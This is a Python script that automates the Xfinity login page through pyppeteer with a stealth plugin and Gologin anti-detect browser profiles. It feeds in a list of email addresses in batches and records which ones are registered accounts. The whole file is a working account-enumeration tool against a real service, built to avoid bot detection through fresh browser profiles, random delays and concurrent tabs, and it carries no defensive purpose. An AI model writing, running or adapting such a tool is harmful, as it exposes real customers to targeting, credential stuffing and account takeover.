import asyncio
import random
from datetime import datetime
from pyppeteer import connect, launch
from pyppeteer_stealth import stealth

from Gologin import CreateBrowser, start_browser, delete_browser, stop_browser
import time

print(datetime.now())

# Semaphore to limit concurrent executions to 5
semaphore = asyncio.Semaphore(6)


def random_fast():
    a = random.uniform(25, 150)
    rounded_float = round(a, 2)
    return rounded_float


def randomtime(min, max):
    return random.randint(min, max)


async def check_login(email, browser):
    async with (semaphore):
        try:
            page = await browser.newPage()

            await page.goto('https://login.xfinity.com/login')
            await asyncio.sleep(randomtime(1, 3))
            await page.bringToFront()

            try:
                # await page.waitForSelector('#onetrust-accept-btn-handler', timeout=5000)
                # await asyncio.sleep(1)
                await page.click('#onetrust-accept-btn-handler')
            except:
                pass

            user = await page.waitForXPath('//*[@id="user"]')
            await asyncio.sleep(1)
            await page.bringToFront()
            await user.type(email)
            await asyncio.sleep(2)
            # await page.type('#user', email, delay=random_fast())
            await page.bringToFront()
            await page.click('#sign_in > prism-text')
            try:
                await page.bringToFront()
                await page.waitForNavigation(timeout=20000)
            except:
                pass
            await asyncio.sleep(5)
            await page.bringToFront()
            reg = await page.xpath('//*[text()="Enter your password"]')
            nonreg = await page.xpath(
                '//*[text()="The Xfinity ID or password you entered was incorrect. Please try again."]')

            if reg:
                result = f"Registered|{email}\n"

            elif nonreg:
                result = f"UnRegistered|{email}\n"

            else:
                result = f"Error|{email}\n"

        except Exception as e:
            print(f"Error occurred: {e}")
            result = f"Error|{email}\n"

        finally:
            await page.close()
            print(result)
            return result


async def main():
    with open("emails.txt", "r") as f:
        emails = f.read().splitlines()

    results = []
    for i in range(0, len(emails), 50):
        browser_id = CreateBrowser()
        wsurl = start_browser(browser_id)
        browser = await connect(browserWSEndpoint=wsurl)
        try:
            tasks = [check_login(email, browser) for email in emails[i:i + 50]]
            results.extend(await asyncio.gather(*tasks, return_exceptions=True))
        finally:
            await browser.close()
            # stop_browser(browser_id)
            await asyncio.sleep(1)
            # delete_browser(browser_id)

    with open("results.txt", "w") as f:
        for result in results:
            f.write(result if isinstance(result, str) else f"Error|{result}")


if __name__ == "__main__":
    asyncio.run(main())

print(datetime.now())
